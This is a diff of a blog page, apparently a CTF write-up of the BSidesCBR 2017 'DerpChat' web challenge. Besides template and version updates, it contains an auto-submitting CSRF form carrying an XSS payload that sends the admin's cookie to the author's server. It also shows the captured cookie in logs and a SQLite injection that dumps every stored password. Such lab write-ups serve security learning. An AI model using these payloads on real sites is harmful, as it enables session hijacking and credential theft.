@@ -6,12 +6,14 @@
 
     <head>
     <link href="https://gmpg.org/xfn/11" rel="profile">
+    
+    <link rel="canonical" href="http://paulsec.github.io/posts/bsidescbr-2017-ctf-write-up-derpchat/">
+    
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.107.0">
 
     
     
@@ -33,9 +35,10 @@ Following my serie of write-ups for the BSidesCBR challs, I will discuss the Der
 The instructions for this challenge were:
 This web-based challenge was worth 275 points. Run docker-compose up and then browse to https://web.shell.dance:4443/. After browsing to https://web.shell.dance:4443/, I arrived on a registration/login page. I registered the account test/test and I finally got a page with two inputs: – One too search some messages I suppose – And one in the middle of the page stating: “Hello, could you please send me the link I was after?" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://paulsec.github.io/posts/bsidescbr-2017-ctf-write-up-derpchat/" />
+<meta property="og:url" content="http://paulsec.github.io/posts/bsidescbr-2017-ctf-write-up-derpchat/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2017-05-07T00:00:00+00:00" />
 <meta property="article:modified_time" content="2017-05-07T00:00:00+00:00" /><meta property="og:site_name" content="PaulSec&#39;s Blog" />
+
 
 
     
@@ -45,7 +48,7 @@ This web-based challenge was worth 275 points. Run docker-compose up and then br
 
 
 
-<link rel="stylesheet" href="/scss/hyde-hyde.92c66d107d7b219f0792cfd67223179af884b03f386ac46894f9f735932bbca3.css" integrity="sha256-ksZtEH17IZ8Hks/WciMXmviEsD84asRolPn3NZMrvKM=">
+<link rel="stylesheet" href="/scss/hyde-hyde.3081c4981fb69a2783dd36ecfdd0e6ba7a158d4cbfdd290ebce8f78ba0469fc6.css" integrity="sha256-MIHEmB&#43;2mieD3Tbs/dDmunoVjUy/3SkOvOj3i6BGn8Y=">
 
 
 <link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
@@ -72,7 +75,11 @@ This web-based challenge was worth 275 points. Run docker-compose up and then br
   <div class="container ">
     <div class="sidebar-about">
       <span class="site__title">
-        <a href="http://paulsec.github.io/"></a>
+        <a href="http://paulsec.github.io/">
+        
+          
+        
+        </a>
       </span>
       
         
@@ -129,7 +136,12 @@ This web-based challenge was worth 275 points. Run docker-compose up and then br
 	
 	
 	
+	
 	<a href="https://github.com/PaulSec" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
 	
 	
 	
@@ -151,7 +163,7 @@ This web-based challenge was worth 275 points. Run docker-compose up and then br
     </div>
     
 <div class="copyright">
-  &copy; 2021 Paul A.
+  &copy; 2023 Paul A.
   
     <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
   
@@ -220,20 +232,20 @@ And finally send it through the DerpChat functionality
 ???
 Continue the CTF :)
 The exploit was basically this one – just triggering a simple form to exploit the XSS and send back the cookie to my Apache server.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web.shell.dance:4443/chat&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bla&#34;</span>&gt;
-&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;document.location=&#39;http://10.0.0.1/cookie?cookie=&#39;+document.cookie&lt;/script&gt;&#34;</span>&gt;
-&lt;/<span style="color:#f92672">form</span>&gt;
-&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;bla&#34;</span>).<span style="color:#a6e22e">submit</span>()&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>And… boom!</p>
-<pre><code>10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &quot;GET /payload.html HTTP/1.1&quot; 200 540 &quot;-&quot; &quot;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&quot;
-10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &quot;GET /cookie?cookie=DerpChat=FYrffsUmaavnBjWHMXGaFGALwtHVUsUmGuRnFgOLGUMBJoGCdMFpdifTiPObbOyAlBfNFsntkjyNxjWxspjQpBxnpzmWYkkErtuwLtZVjSbMUBwaWbRnQcKsKIQZPVmcwKUIUMpfYDwTfbRFfiCYcrEcdSWMKQjMVSqkKonwXBhCuzDtBZnHjMOtZmJedUzxrhgKusjmOLZlSbeHyNrSNaZVktZOBNroEbHBLQGCMmwGdAHPjLFUgOGlOUaBIthfqgIrpWnUuVJiQqxgeAplCNzDvVbTOsZfdcanPiehcKaWjXooJecnNAAVFSQLHenaNmdXSxsfGxCXiZREjLIdWacPnqDQbGeufRtgVoAsfQiUfLiHghsSfuNuennPhEPKsWkkHVgaTcxSdCSYTwtprLBLULVHgfqpHHKRmFqrDqsVIjPcZUiyWfmtJtmjHFunknPTCqIzEYomxhzpIQjLzLHUXsMyUPuNaOJwgtGbxOeTPjddVQgHYllKbOdyKSCb HTTP/1.1&quot; 404 498 &quot;-&quot; &quot;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&quot;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web.shell.dance:4443/chat&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bla&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;document.location=&#39;http://10.0.0.1/cookie?cookie=&#39;+document.cookie&lt;/script&gt;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;bla&#34;</span>).<span style="color:#a6e22e">submit</span>()&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>And… boom!</p>
+<pre tabindex="0"><code>10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &#34;GET /payload.html HTTP/1.1&#34; 200 540 &#34;-&#34; &#34;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&#34;
+10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &#34;GET /cookie?cookie=DerpChat=FYrffsUmaavnBjWHMXGaFGALwtHVUsUmGuRnFgOLGUMBJoGCdMFpdifTiPObbOyAlBfNFsntkjyNxjWxspjQpBxnpzmWYkkErtuwLtZVjSbMUBwaWbRnQcKsKIQZPVmcwKUIUMpfYDwTfbRFfiCYcrEcdSWMKQjMVSqkKonwXBhCuzDtBZnHjMOtZmJedUzxrhgKusjmOLZlSbeHyNrSNaZVktZOBNroEbHBLQGCMmwGdAHPjLFUgOGlOUaBIthfqgIrpWnUuVJiQqxgeAplCNzDvVbTOsZfdcanPiehcKaWjXooJecnNAAVFSQLHenaNmdXSxsfGxCXiZREjLIdWacPnqDQbGeufRtgVoAsfQiUfLiHghsSfuNuennPhEPKsWkkHVgaTcxSdCSYTwtprLBLULVHgfqpHHKRmFqrDqsVIjPcZUiyWfmtJtmjHFunknPTCqIzEYomxhzpIQjLzLHUXsMyUPuNaOJwgtGbxOeTPjddVQgHYllKbOdyKSCb HTTP/1.1&#34; 404 498 &#34;-&#34; &#34;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&#34;
 </code></pre><p>After grabbing the admin’s cookie, I just replaced it in my current browser’s session and managed to get access to the admin interface.</p>
 <p>There, I finally got access to the administration interface (yay!) and the functionality was some kind of ‘User Management’ utility. I got the point (based on the error messages) that there was a SQL injection and the DBMS was SQLite. Morever, during the recon, I managed to retrieve the name of a table: Users (important point).</p>
 <p>In case you encounter SQLite in the back-end, I definitely recommend this Cheat Sheet.</p>
 <p>Thanks to OJ that I pinged on Twitter and his “hindsight”, I finally got the SQLi working, dumping out the flag by concatenating all the user’s passwords:</p>
-<pre><code>' || (select group_concat(Password) from Users) || '
+<pre tabindex="0"><code>&#39; || (select group_concat(Password) from Users) || &#39;
 </code></pre><p>This gave us the following output:</p>
-<pre><code>FLAG,LMZqNQlADkoebSGEULvZSFdFVTgsFFhe,BSIDES_CTF{w3b_app5_r_hard_am_1_r1ght},test,test
+<pre tabindex="0"><code>FLAG,LMZqNQlADkoebSGEULvZSFdFVTgsFFhe,BSIDES_CTF{w3b_app5_r_hard_am_1_r1ght},test,test
 </code></pre><p>Bingo, we got the flag! This chall was really interesting, and chaining Client-side vulnerabilities (Cross-Site Scripting, CSRF) and finally SQLi to grab the flag was fun.</p>
 
   </div>
@@ -268,16 +280,7 @@ The exploit was basically this one – just triggering a simple form to exploit 
         
     
 
-<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
-
-
-    
-    
-    <script type="text/javascript">
-        
-        hljs.initHighlightingOnLoad();
-    </script>
-    
+<script defer src="https://use.fontawesome.com/releases/v5.12.1/js/all.js" integrity="sha384-ZbbbT1gw3joYkKRqh0kWyRp32UAvdqkpbLedQJSlnI8iLQcFVxaGyrOgOJiDQTTR" crossorigin="anonymous"></script>
 
 
 
